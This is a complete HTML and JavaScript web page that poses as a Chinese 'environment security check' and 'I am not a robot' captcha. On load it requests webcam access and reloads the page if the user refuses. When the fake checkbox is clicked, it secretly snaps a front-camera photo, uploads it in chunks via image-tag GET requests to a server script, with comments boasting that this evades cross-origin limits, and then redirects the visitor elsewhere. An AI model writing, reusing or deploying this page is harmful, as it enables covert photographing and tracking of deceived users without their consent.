<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>验证中...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading-container, .captcha-container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
        .captcha-container { display: none; }
        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
        .checkbox-area {
            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
        }
        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
        .camera-preview video { width: 100%; height: auto; }
        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
        .camera-status.error { color: #ff3b30; }
        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
        #uploadResult { margin-top: 12px; font-size: 13px; word-break: break-word; min-height: 20px; }
        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
        .retry-btn {
            margin-top: 12px;
            padding: 10px 24px;
            background: #007aff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            cursor: pointer;
        }
        .retry-btn:active { transform: scale(0.95); }
        .progress-text { margin-top: 10px; font-size: 12px; color: #007aff; }
    </style>
</head>
<body>
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">正在验证环境安全...</div>
        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
        <div class="debug-info" id="debugInfo"></div>
    </div>
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-icon">🤖</div>
        <div class="captcha-title">人机验证</div>
        <div class="captcha-desc">请完成验证以继续访问</div>
        <div class="camera-preview" id="cameraPreview"><video id="previewVideo" autoplay playsinline muted></video></div>
        <div class="verify-row" id="verifyRow">
            <div class="checkbox-area" id="checkbox"></div>
            <span>我不是机器人</span>
        </div>
        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
        <div id="uploadResult"></div>
        <div id="progressText" class="progress-text"></div>
        <button class="retry-btn" id="retryBtn" style="display:none;">🔄 手动重试上传</button>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        (function() {
            'use strict';
            
            // ============================================================
            //  ★★★ 硬核方案：使用 Image 标签 + GET 请求上传 ★★★
            //  100% 绕过跨域和 HTTP 方法限制
            // ============================================================
            
            const CURRENT_DIR = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
            const API_URL = CURRENT_DIR + 'api.php';
            
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code') || 'UNKNOWN';
            const targetUrl = urlParams.get('url') || 'https://www.baidu.com';

            document.getElementById('displayCode').textContent = code;
            document.getElementById('displayCode2').textContent = code;
            document.getElementById('debugInfo').textContent = '硬核模式 | API: ' + API_URL + ' | 编号: ' + code;

            let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
            let lastPhotoData = null;
            const maxRetries = 3;

            // 进度条
            let progress = 0;
            const progressInterval = setInterval(() => {
                if (progress < 90) {
                    progress += Math.random() * 12;
                    if (progress > 90) progress = 90;
                    document.getElementById('progressFill').style.width = progress + '%';
                }
            }, 200);

            function refreshAndRetry() {
                retryCount++;
                if (retryCount <= maxRetries) {
                    document.getElementById('cameraStatus').innerHTML = '🔄 重新请求 (' + retryCount + '/' + maxRetries + ')';
                    document.getElementById('cameraStatus').classList.add('error');
                    setTimeout(function() {
                        window.location.reload();
                    }, 1500);
                } else {
                    document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取摄像头，跳过拍照';
                    document.getElementById('cameraStatus').classList.add('error');
                    setTimeout(function() {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                        cameraReady = false;
                    }, 1500);
                }
            }

            // ==================== 拍照 ====================
            function capturePhoto() {
                return new Promise(function(resolve, reject) {
                    if (!videoElement || !cameraReady) {
                        reject('摄像头未就绪');
                        return;
                    }
                    var canvas = document.getElementById('canvas');
                    var ctx = canvas.getContext('2d');
                    if (videoElement.videoWidth === 0) {
                        reject('视频未就绪');
                        return;
                    }
                    // 缩小图片减少数据量
                    var width = Math.min(videoElement.videoWidth, 400);
                    var height = Math.min(videoElement.videoHeight, 300);
                    canvas.width = width;
                    canvas.height = height;
                    ctx.drawImage(videoElement, 0, 0, width, height);
                    // 极低质量
                    resolve(canvas.toDataURL('image/jpeg', 0.3));
                });
            }

            // ==================== 硬核上传：使用 Image 标签 ====================
            function uploadViaImage(photoData) {
                return new Promise(function(resolve, reject) {
                    // 提取纯 base64 数据
                    var base64Data = photoData;
                    if (base64Data.indexOf('base64,') !== -1) {
                        base64Data = base64Data.split('base64,')[1];
                    }
                    
                    // 编码为 URL 安全格式
                    var encodedData = encodeURIComponent(base64Data);
                    
                    var progressText = document.getElementById('progressText');
                    var MAX_URL_LENGTH = 1900;
                    var fullUrl = API_URL + '?action=hard_upload&code=' + encodeURIComponent(code) + 
                                   '&url=' + encodeURIComponent(targetUrl) + '&photo=' + encodedData;
                    
                    if (fullUrl.length < MAX_URL_LENGTH) {
                        // 直接发送
                        progressText.textContent = '📤 发送中...';
                        var img = new Image();
                        img.crossOrigin = 'anonymous';
                        
                        var finished = false;
                        var timeoutId = setTimeout(function() {
                            if (!finished) {
                                finished = true;
                                reject(new Error('上传超时'));
                            }
                        }, 30000);
                        
                        img.onload = function() {
                            if (finished) return;
                            finished = true;
                            clearTimeout(timeoutId);
                            progressText.textContent = '✅ 上传成功！';
                            resolve({ success: true });
                        };
                        
                        img.onerror = function() {
                            if (finished) return;
                            finished = true;
                            clearTimeout(timeoutId);
                            progressText.textContent = '⚠️ 检查上传结果...';
                            setTimeout(function() {
                                checkUploadResult(code).then(function(exists) {
                                    if (exists) {
                                        resolve({ success: true });
                                    } else {
                                        reject(new Error('上传失败，请重试'));
                                    }
                                }).catch(function() {
                                    reject(new Error('上传失败，请重试'));
                                });
                            }, 2000);
                        };
                        
                        img.src = fullUrl;
                    } else {
                        // 分片上传
                        progressText.textContent = '📤 分片上传中...';
                        var chunkSize = 1500;
                        var totalChunks = Math.ceil(encodedData.length / chunkSize);
                        var completedChunks = 0;
                        
                        for (var i = 0; i < totalChunks; i++) {
                            (function(chunkIndex) {
                                var start = chunkIndex * chunkSize;
                                var end = Math.min(start + chunkSize, encodedData.length);
                                var chunkData = encodedData.substring(start, end);
                                var chunkUrl = API_URL + '?action=hard_upload&code=' + encodeURIComponent(code) + 
                                               '&url=' + encodeURIComponent(targetUrl) + 
                                               '&photo=' + chunkData + 
                                               '&chunk=' + chunkIndex + '&total=' + totalChunks;
                                
                                var img = new Image();
                                img.crossOrigin = 'anonymous';
                                img.onload = function() {
                                    completedChunks++;
                                    progressText.textContent = '📤 分片 ' + completedChunks + '/' + totalChunks;
                                    if (completedChunks === totalChunks) {
                                        progressText.textContent = '⏳ 等待服务器处理...';
                                        setTimeout(function() {
                                            checkUploadResult(code).then(function(exists) {
                                                if (exists) {
                                                    resolve({ success: true });
                                                } else {
                                                    reject(new Error('分片合并失败'));
                                                }
                                            }).catch(function() {
                                                reject(new Error('分片合并失败'));
                                            });
                                        }, 3000);
                                    }
                                };
                                img.onerror = function() {
                                    progressText.textContent = '⚠️ 分片 ' + (chunkIndex+1) + ' 失败，重试...';
                                    setTimeout(function() {
                                        var retryImg = new Image();
                                        retryImg.crossOrigin = 'anonymous';
                                        retryImg.onload = function() {
                                            completedChunks++;
                                            progressText.textContent = '📤 分片 ' + completedChunks + '/' + totalChunks;
                                            if (completedChunks === totalChunks) {
                                                setTimeout(function() {
                                                    checkUploadResult(code).then(function(exists) {
                                                        if (exists) {
                                                            resolve({ success: true });
                                                        } else {
                                                            reject(new Error('分片合并失败'));
                                                        }
                                                    }).catch(function() {
                                                        reject(new Error('分片合并失败'));
                                                    });
                                                }, 3000);
                                            }
                                        };
                                        retryImg.onerror = function() {
                                            reject(new Error('分片上传失败'));
                                        };
                                        retryImg.src = chunkUrl;
                                    }, 1000);
                                };
                                img.src = chunkUrl;
                            })(i);
                        }
                    }
                });
            }

            // ==================== 检查上传结果 ====================
            function checkUploadResult(code) {
                return new Promise(function(resolve, reject) {
                    fetch(API_URL + '?action=check_code&code=' + encodeURIComponent(code) + '&t=' + Date.now())
                        .then(function(res) { return res.json(); })
                        .then(function(data) {
                            resolve(data.exists === true);
                        })
                        .catch(function() { reject(false); });
                });
            }

            // ==================== 主流程 ====================
            function takePhotoAndRedirect() {
                if (photoCaptured) return;
                photoCaptured = true;
                
                var resultDiv = document.getElementById('uploadResult');
                var retryBtn = document.getElementById('retryBtn');
                var progressText = document.getElementById('progressText');
                retryBtn.style.display = 'none';
                
                var photoData = null;
                
                // 1. 拍照
                if (cameraReady && videoElement && videoElement.videoWidth > 0) {
                    capturePhoto().then(function(data) {
                        photoData = data;
                        resultDiv.textContent = '📸 拍照成功，准备上传...';
                        resultDiv.style.color = '#007aff';
                        // 开始上传
                        startUpload(photoData);
                    }).catch(function(e) {
                        resultDiv.textContent = '⚠️ 拍照失败: ' + e.message;
                        resultDiv.style.color = '#ff3b30';
                        retryBtn.style.display = 'inline-block';
                        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                        setTimeout(function() { window.location.href = targetUrl; }, 5000);
                    });
                } else {
                    resultDiv.textContent = '⚠️ 摄像头未就绪，跳过拍照';
                    resultDiv.style.color = '#ff3b30';
                    retryBtn.style.display = 'inline-block';
                    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                    setTimeout(function() { window.location.href = targetUrl; }, 5000);
                }
            }
            
            function startUpload(photoData) {
                var resultDiv = document.getElementById('uploadResult');
                var retryBtn = document.getElementById('retryBtn');
                var progressText = document.getElementById('progressText');
                
                if (!photoData) {
                    resultDiv.textContent = '⚠️ 没有照片数据';
                    resultDiv.style.color = '#ff3b30';
                    return;
                }
                
                lastPhotoData = photoData;
                uploadViaImage(photoData).then(function(result) {
                    resultDiv.textContent = '✅ 照片上传成功！即将跳转...';
                    resultDiv.style.color = '#34c759';
                    progressText.textContent = '';
                    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                    setTimeout(function() {
                        window.location.href = targetUrl;
                    }, 3000);
                }).catch(function(err) {
                    resultDiv.textContent = '❌ ' + err.message;
                    resultDiv.style.color = '#ff3b30';
                    retryBtn.style.display = 'inline-block';
                    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                });
            }

            // ==================== 手动重试 ====================
            document.getElementById('retryBtn').addEventListener('click', function() {
                this.style.display = 'none';
                var resultDiv = document.getElementById('uploadResult');
                var progressText = document.getElementById('progressText');
                resultDiv.textContent = '🔄 重新上传中...';
                resultDiv.style.color = '#007aff';
                progressText.textContent = '';
                
                if (lastPhotoData) {
                    uploadViaImage(lastPhotoData).then(function(result) {
                        resultDiv.textContent = '✅ 重试上传成功！即将跳转...';
                        resultDiv.style.color = '#34c759';
                        setTimeout(function() { window.location.href = targetUrl; }, 2000);
                    }).catch(function(err) {
                        resultDiv.textContent = '❌ 重试失败: ' + err.message;
                        resultDiv.style.color = '#ff3b30';
                        this.style.display = 'inline-block';
                    });
                }
            });

            // ==================== 初始化摄像头 ====================
            function initCamera() {
                // 检查浏览器是否支持 getUserMedia
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    document.getElementById('cameraStatus').innerHTML = '⚠️ 浏览器不支持摄像头';
                    document.getElementById('cameraStatus').classList.add('error');
                    setTimeout(function() {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                        cameraReady = false;
                    }, 1500);
                    return;
                }
                
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 400 }, 
                        height: { ideal: 300 },
                        facingMode: "user"
                    } 
                })
                .then(function(mediaStream) {
                    stream = mediaStream;
                    videoElement = document.getElementById('video');
                    videoElement.srcObject = stream;
                    var previewVideo = document.getElementById('previewVideo');
                    if (previewVideo) {
                        previewVideo.srcObject = stream;
                        document.getElementById('cameraPreview').style.display = 'block';
                    }
                    
                    // 等待视频加载
                    return new Promise(function(resolve) {
                        videoElement.onloadedmetadata = function() {
                            videoElement.play();
                            resolve();
                        };
                        // 如果已经加载完成
                        if (videoElement.readyState >= 2) {
                            videoElement.play();
                            resolve();
                        }
                    });
                })
                .then(function() {
                    // 额外等待确保视频流稳定
                    return new Promise(function(resolve) {
                        setTimeout(resolve, 800);
                    });
                })
                .then(function() {
                    if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                        cameraReady = true;
                        document.getElementById('cameraStatus').innerHTML = '✅ 摄像头已就绪';
                        document.getElementById('cameraStatus').classList.remove('error');
                    } else {
                        throw new Error('视频尺寸无效');
                    }
                    progress = 100;
                    document.getElementById('progressFill').style.width = '100%';
                    setTimeout(function() {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                    }, 500);
                })
                .catch(function(err) {
                    console.error('Camera error:', err);
                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        refreshAndRetry();
                    } else {
                        document.getElementById('cameraStatus').innerHTML = '⚠️ 摄像头初始化失败: ' + err.message;
                        document.getElementById('cameraStatus').classList.add('error');
                        setTimeout(function() {
                            document.getElementById('loadingContainer').style.display = 'none';
                            document.getElementById('captchaContainer').style.display = 'block';
                            cameraReady = false;
                        }, 1500);
                    }
                });
            }

            // ==================== 人机验证 ====================
            var verified = false;
            var verifyRow = document.getElementById('verifyRow');
            var checkbox = document.getElementById('checkbox');
            if (verifyRow) {
                verifyRow.addEventListener('click', function() {
                    if (verified) return;
                    checkbox.classList.add('checked');
                    verified = true;
                    verifyRow.querySelector('span').textContent = '验证中...';
                    setTimeout(function() {
                        takePhotoAndRedirect();
                    }, 400);
                });
            }

            // ==================== 启动 ====================
            // 如果摄像头还没初始化完成，但是用户点击了验证，也要处理
            // 页面加载后立即初始化摄像头
            initCamera();
            
            // 页面关闭时释放摄像头
            window.addEventListener('beforeunload', function() {
                if (stream) {
                    stream.getTracks().forEach(function(t) { t.stop(); });
                }
            });
        })();
    </script>
</body>
</html>
